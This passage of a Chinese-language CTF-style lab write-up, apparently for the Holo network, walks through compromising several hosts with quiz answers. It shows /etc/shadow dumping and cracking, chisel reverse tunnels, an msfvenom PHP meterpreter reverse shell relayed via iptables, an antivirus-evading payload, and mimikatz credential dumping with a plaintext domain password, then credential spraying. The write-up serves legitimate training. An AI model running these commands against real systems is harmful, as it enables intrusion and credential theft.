 <span class="hljs-keyword">in</span> 0.001s  <br><br>2022-07-05 09:54:00 (3.29 MB/s) - <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span> saved [3448/3448]<br><br>www-data@ip-10-200-112-33:/var/www/html$ <span class="hljs-built_in">ls</span><br>CVE-2021-2043.py  css	 images   index.php  sass    shell.php<br>about.php	  fonts  img.php  js	     sh.php  talents.php<br>www-data@ip-10-200-112-33:/var/www/html$ python3 CVE-2021-2043.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-da<br></code></pre></td></tr></table></figure>
+
+<p><strong>What user is the database running as?</strong></p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">www</span>-<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the full path of the binary with an SUID bit set on L-SRV01?</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin/docker<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the full first line of the exploit for the SUID bit?</strong></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo install -m =xs <span class="hljs-constructor">$(<span class="hljs-params">which</span> <span class="hljs-params">docker</span>)</span> .<br></code></pre></td></tr></table></figure>
+
+<h4 id="权限维持："><a href="#权限维持：" class="headerlink" title="权限维持："></a>权限维持：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-200-112-33:/var/www/html<span class="hljs-comment"># cat /etc/shadow    </span><br>root:$6$TvYo6Q8EXPuYD8w0<span class="hljs-variable">$Yc</span>.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::<br>linux-admin:$6$Zs4KmlUsMiwVLy2y<span class="hljs-variable">$V8S5G3q7tpBMZip8Iv</span>/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::<br>root@ip-10-200-112-33:/var/www/html<span class="hljs-comment"># cat /etc/passwd</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ unshadow passwd shadow &gt; unshadowed.txt<br>$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt<br></code></pre></td></tr></table></figure>
+
+<p>我没破解出来。查了下别人的答案。我为root生成了ssh秘钥用以维权。</p>
+<p><strong>What non-default user can we find in the shadow file on L-SRV01?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">linux-admin</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the plaintext cracked password from the shadow hash?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">linuxrulez</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="内网横向S-SRV01："><a href="#内网横向S-SRV01：" class="headerlink" title="内网横向S-SRV01："></a>内网横向S-SRV01：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./chisel server -p 8080 --reverse<br>2022/07/05 18:38:42 server: Reverse tunnelling enabled<br>2022/07/05 18:38:42 server: Fingerprint ThK1lsNqnPGXaWXpnJtEgrrU0mNMmzQ3ACbX+lJklDo=<br>2022/07/05 18:38:42 server: Listening on http://0.0.0.0:8080<br>2022/07/05 18:38:48 server: session<span class="hljs-comment">#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-200-112-33:/tmp/tmplawro5t1<span class="hljs-comment"># wget http://10.50.109.110/chisel</span><br>--2022-07-05 10:34:06--  http://10.50.109.110/chisel<br>Connecting to 10.50.109.110:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 8077312 (7.7M) [application/octet-stream]<br>Saving to: <span class="hljs-string">&#x27;chisel&#x27;</span><br><br>chisel              100%[===================&gt;]   7.70M   340KB/s    <span class="hljs-keyword">in</span> 23s     <br><br>2022-07-05 10:34:30 (337 KB/s) - <span class="hljs-string">&#x27;chisel&#x27;</span> saved [8077312/8077312]<br><br>root@ip-10-200-112-33:/tmp/tmplawro5t1<span class="hljs-comment"># ls</span><br>&lt;tmplawro5t1<span class="hljs-comment"># ./chisel client 10.50.109.110:8080 R:socks                     </span><br>2022/07/05 10:38:09 client: Connecting to ws://10.50.109.110:8080<br>2022/07/05 10:38:11 client: Connection error: server: Reverse port forwaring not enabled on server<br>2022/07/05 10:38:11 client: Give up<br>&lt;awro5t1<span class="hljs-comment"># ./chisel client 10.50.109.110:8080 R:socks</span><br>2022/07/05 10:38:45 client: Connecting to ws://10.50.109.110:8080<br>2022/07/05 10:38:47 client: Connected (Latency 307.675094ms)<br></code></pre></td></tr></table></figure>
+
+<p>探测一下内网主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-200-112-33:/root<span class="hljs-comment"># for i in &#123;1..254&#125;; do (ping -c 1 10.200.112.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span><br>64 bytes from 10.200.112.1: icmp_seq=1 ttl=255 time=0.270 ms<br>64 bytes from 10.200.112.30: icmp_seq=1 ttl=128 time=0.555 ms<br>64 bytes from 10.200.112.31: icmp_seq=1 ttl=128 time=0.449 ms<br>64 bytes from 10.200.112.33: icmp_seq=1 ttl=64 time=0.021 ms<br>64 bytes from 10.200.112.35: icmp_seq=1 ttl=128 time=0.481 ms<br>64 bytes from 10.200.112.250: icmp_seq=1 ttl=64 time=0.451 ms<br></code></pre></td></tr></table></figure>
+
+<p>按照目标路径现在应该要先拿31，可以先快速探测一遍端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-200-112-33:/root<span class="hljs-comment"># nohup nc -zv 10.200.112.31</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># cat 10.200.112.31 | grep succeeded</span><br>Connection to 10.200.112.31 22 port [tcp/ssh] succeeded!<br>Connection to 10.200.112.31 80 port [tcp/http] succeeded!<br>Connection to 10.200.112.31 135 port [tcp/epmap] succeeded!<br>Connection to 10.200.112.31 139 port [tcp/netbios-ssn] succeeded!<br>Connection to 10.200.112.31 443 port [tcp/https] succeeded!<br>Connection to 10.200.112.31 445 port [tcp/microsoft-ds] succeeded!<br>Connection to 10.200.112.31 3306 port [tcp/mysql] succeeded!<br>Connection to 10.200.112.31 3389 port [tcp/ms-wbt-server] succeeded!<br>Connection to 10.200.112.31 5985 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 47001 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49664 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49665 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49666 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49667 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49668 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49669 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49670 port [tcp/*] succeeded!<br>Connection to 10.200.112.31 49672 port [tcp/*] succeeded!<br></code></pre></td></tr></table></figure>
+
+<p>端口特征呈windows状。80端口开放的，可以先看一眼：</p>
+<p><img src="https://www.worldisend.com/img/image-20220705195528103.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705195528103"></p>
+<p>与admin.holo.live一样的。不过输入admin会登录失败，不过有个忘记密码的功能，可以被用来枚举用户名：</p>
+<p><img src="https://www.worldisend.com/img/image-20220705195908610.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705195908610"></p>
+<p><img src="https://www.worldisend.com/img/image-20220705200431538.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705200431538"></p>
+<p>将令牌附加到url参数中，会跳转到一个reset.php页面，看起来像是重置密码的地方。不需要输密码，输入用户名直接点击更新会跳转到包含flag的页面。</p>
+<p><strong>What user can we control for a password reset on S-SRV01?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">gurag</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the name of the cookie intercepted on S-SRV01?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">user_token</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the size of the cookie intercepted on S-SRV01?</strong></p>
+<p><img src="https://www.worldisend.com/img/image-20220705201103931.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705201103931"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">110<br></code></pre></td></tr></table></figure>
+
+<p><strong>What page does the reset redirect you to when successfully authenticated on S-SRV01?</strong></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">reset</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>之后就可以回到登录页面了，一个上传图片的地方:</p>
+<p><img src="https://www.worldisend.com/img/image-20220705201515666.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705201515666"></p>
+<p>右键源代码，前端验证：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br>&lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>    &lt;title&gt;holo.live - Upload&lt;/title&gt;<br>    &lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;favicon.png&quot;/&gt;<br>    &lt;script&gt;<br>      window.onload = function() &#123;<br>        var upload = document.getElementById(&quot;fileToUpload&quot;);<br>        upload.value=&quot;&quot;;<br>        upload.addEventListener(&quot;change&quot;,function(event) &#123;<br>          var file = this.files[0];<br>          if (file.type != &quot;image/jpeg&quot;) &#123;<br>            upload.value=&quot;&quot;;<br>            alert(&quot;dorkstork server bork&quot;);<br>          &#125;<br>        &#125;);<br>      &#125;;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以用metasploit生成一个PHP载荷,因为是内网穿透过去的，要先把跳板机改造成中继器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -I INPUT -p tcp -m tcp --dport 4444 -j ACCEPT</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -t nat -A PREROUTING -p tcp --dport 4444 -j DNAT --to-destination 10.50.109.110:4444</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -t nat -A POSTROUTING -j MASQUERADE</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -I FORWARD -j ACCEPT</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -P FORWARD ACCEPT</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># sysctl net.ipv4.ip_forward=1</span><br>net.ipv4.ip_forward = 1<br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -t nat -v -L PREROUTING -n --line-number</span><br>Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)<br>num   pkts bytes target     prot opt <span class="hljs-keyword">in</span>     out     <span class="hljs-built_in">source</span>               destination         <br>1     264K   12M DOCKER     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ADDRTYPE match dst-type LOCAL<br>2        0     0 DNAT       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4444 to:10.50.109.110:4444<br></code></pre></td></tr></table></figure>
+
+<p>msfvenom生成载荷，将其改为中继器的端口，然后中继器会把数据流量转发给我：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.200.112.33 <span class="hljs-attribute">LPORT</span>=4444 -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220705203539493.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705203539493"></p>
+<p>选中把这段校验给删了.</p>
+<p><img src="https://www.worldisend.com/img/image-20220705203630736.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705203630736"></p>
+<p>但是访问没访问到,而且我不知道他的目录。看题目是被杀了，但是我再次上传时候显示文件已存在，看来只是我找不到目录,我尝试爆破了一遍目录，发现了image目录。尝试访问webshell对应路径，木马回连成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="hljs-built_in">set</span> payload php/meterpreter_reverse_tcp <br>payload =&gt; php/meterpreter_reverse_tcp<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="hljs-built_in">set</span> LHOST 10.50.109.110<br>LHOST =&gt; 10.50.109.110<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="hljs-built_in">set</span> LPORT 4444<br>LPORT =&gt; 4444<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run<br><br>[*] Started reverse TCP handler on 10.50.109.110:4444 <br>[*] Meterpreter session 1 opened (10.50.109.110:4444 -&gt; 10.200.112.33:50234) at 2022-07-05 20:57:29 +0800<br><br>(Meterpreter 1)(C:\web\htdocs\images) &gt; getuid<br>Server username: SYSTEM<br>(Meterpreter 1)(C:\web\htdocs\images) &gt; <br></code></pre></td></tr></table></figure>
+
+<p>直接就是system权限。不过PHP的meterpreter无法正常执行例如hashdump功能，介于目标可能有杀软，还是生成个免杀exe比较好。</p>
+<p><img src="https://www.worldisend.com/img/image-20220705212658470.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705212658470"></p>
+<p>生成release版本，上传到目标：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">(Meterpreter 3)(C:\ProgramData) &gt; <span class="hljs-built_in">cd</span> desktop<br>(Meterpreter 3)(C:\Users\Public\Desktop) &gt; upload /media/mosaictheory/Parrot/<br>.Trash-1000  ISO          Toolbox      VMware       book         <br>(Meterpreter 3)(C:\Users\Public\Desktop) &gt; upload /media/mosaictheory/Parrot/ISO/mosaic.exe<br>[*] uploading  : /media/mosaictheory/Parrot/ISO/mosaic.exe -&gt; mosaic.exe<br>[*] Uploaded -1.00 B of 12.50 KiB (-0.01%): /media/mosaictheory/Parrot/ISO/mosaic.exe -&gt; mosaic.exe<br>[*] uploaded   : /media/mosaictheory/Parrot/ISO/mosaic.exe -&gt; mosaic.exe<br>(Meterpreter 3)(C:\Users\Public\Desktop) &gt; <span class="hljs-built_in">ls</span><br>Listing: C:\Users\Public\Desktop<br>================================<br><br>Mode              Size   Type  Last modified              Name<br>----              ----   ----  -------------              ----<br>100666/rw-rw-rw-  2206   fil   2021-12-16 08:07:26 +0800  Google Chrome.lnk<br>100666/rw-rw-rw-  174    fil   2018-09-15 15:16:48 +0800  desktop.ini<br>100777/rwxrwxrwx  12800  fil   2022-07-05 21:31:41 +0800  mosaic.exe<br><br>(Meterpreter 3)(C:\Users\Public\Desktop) &gt; <br></code></pre></td></tr></table></figure>
+
+<p>然后到中继器上放行转发4445端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -I INPUT -p tcp -m tcp --dport 4445 -j ACCEPT</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -t nat -A PREROUTING -p tcp --dport 4445 -j DNAT --to-destination 10.50.109.110:4445</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -t nat -A POSTROUTING -j MASQUERADE</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -I FORWARD -j ACCEPT</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -P FORWARD ACCEPT</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># sysctl net.ipv4.ip_forward=1</span><br>root@ip-10-200-112-33:/root<span class="hljs-comment"># iptables -t nat -v -L PREROUTING -n --line-number</span><br>Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)<br>num   pkts bytes target     prot opt <span class="hljs-keyword">in</span>     out     <span class="hljs-built_in">source</span>               destination         <br>1     264K   12M DOCKER     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ADDRTYPE match dst-type LOCAL<br>2        6   312 DNAT       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4444 to:10.50.109.110:4444<br>3        0     0 DNAT       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4445 to:10.50.109.110:4445<br></code></pre></td></tr></table></figure>
+
+<p>这PHPshell也触发不了载荷执行。那我还是得靠PHP文件去执行:</p>
+<p><img src="https://www.worldisend.com/img/image-20220705220945411.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705220945411"></p>
+<p>上线之后就抓取hash了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">beacon&gt; hashdump<br>[*] Tasked beacon to dump hashes<br>[+] host called home, sent: 82541 bytes<br>[+] received password hashes:<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c529921152aab85192532e2c8771a92:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>lol:1009:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::<br>sshd:1008:aad3b435b51404eeaad3b435b51404ee:aa705c01307dc6b159c533da7329962b:::<br>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1::<br></code></pre></td></tr></table></figure>
+
+<p>但是如果再上传一个mimikatz的话还能看到另一个域账户的凭证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">beacon&gt; shell C:\Users\Administrator\Desktop\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-built_in">exit</span><br>[*] Tasked beacon to run: C:\Users\Administrator\Desktop\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-built_in">exit</span><br>[+] host called home, sent: 142 bytes<br>[+] received output:<br><br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz(commandline) <span class="hljs-comment"># privilege::debug</span><br>Privilege <span class="hljs-string">&#x27;20&#x27;</span> OK<br><br>mimikatz(commandline) <span class="hljs-comment"># token::elevate</span><br>Token Id  : 0<br>User name : <br>SID name  : NT AUTHORITY\SYSTEM<br><br>668	&#123;0;000003e7&#125; 1 D 21434     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary<br> -&gt; Impersonated !<br> * Process Token : &#123;0;000003e7&#125; 0 D 3563290   	NT AUTHORITY\SYSTEM	S-1-5-18	(16g,28p)	Primary<br> * Thread Token  : &#123;0;000003e7&#125; 1 D 3589329   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)<br><br>mimikatz(commandline) <span class="hljs-comment"># sekurlsa::logonpasswords</span><br><br>Authentication Id : 0 ; 300197 (00000000:000494a5)<br>Session           : Interactive from 1<br>User Name         : watamet<br>Domain            : HOLOLIVE<br>Logon Server      : DC-SRV01<br>Logon Time        : 7/5/2022 7:16:52 AM<br>SID               : S-1-5-21-471847105-3603022926-1728018720-1132<br>	msv :	<br>	 [00000003] Primary<br>	 * Username : watamet<br>	 * Domain   : HOLOLIVE<br>	 * NTLM     : d8d41e6cf762a8c77776a1843d4141c9<br>	 * SHA1     : 7701207008976fdd6c6be9991574e2480853312d<br>	 * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0<br>	tspkg :	<br>	wdigest :	<br>	 * Username : watamet<br>	 * Domain   : HOLOLIVE<br>	 * Password : (null)<br>	kerberos :	<br>	 * Username : watamet<br>	 * Domain   : HOLO.LIVE<br>	 * Password : Nothingtoworry!<br>	ssp :	<br>	credman :	<br></code></pre></td></tr></table></figure>
+
+<p><strong>What domain user’s credentials can we dump on S-SRV01?</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">watamet</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the domain user’s password that we can dump on S-SRV01?</strong></p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Nothingtoworry!<br></code></pre></td></tr></table></figure>
+
+<h4 id="内网横向PC-FILESSRV01："><a href="#内网横向PC-FILESSRV01：" class="headerlink" title="内网横向PC-FILESSRV01："></a>内网横向PC-FILESSRV01：</h4><p><strong>What is the hostname of the remote endpoint we can authenticate to?</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PC-FILESRV01<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> watamet &gt; <span class="hljs-built_in">users</span><br>$ <span class="hljs-built_in">echo</span> Nothingtoworry! &gt; passwd<br>$ proxychains crackmapexec smb 10.200.112.0/24 -u <span class="hljs-built_in">users</span> -p passwd &gt; result<br>$ <span class="hljs-built_in">cat</span> result <br>ProxyChains-3.1 (http://proxychains.sf.net)<br>SMB         10.200.112.30   445    DC-SRV01         [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)<br>SMB         10.200.112.31   445    S-SRV01          [*] Windows 10.0 Build 17763 x64 (name:S-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)<br>SMB         10.200.112.35   445    PC-FILESRV01     [*] Windows 10.0 Build 17763 x64 (name:PC-FILESRV01) (domain:holo.live) (signing:False) (SMBv1:False)<br>SMB         10.200.112.30   445    DC-SRV01         [+] holo.live\watamet d8d41e6cf762a8c77776a1843d4141c9 <br>SMB         10.200.112.31   445    S-SRV01          [+] holo.live\watamet d8d41e6cf762a8c77776a1843d4141c9 (Pwn3d!)<br>SMB         10.200.112.35   445    PC-FILESRV01     [+] holo.live\watamet d8d41e6cf762a8c77776a1843d4141c9 <br></code></pre></td></tr></table></figure>
+
+<p>但路线顺序是先打10.200.112.35：</p>
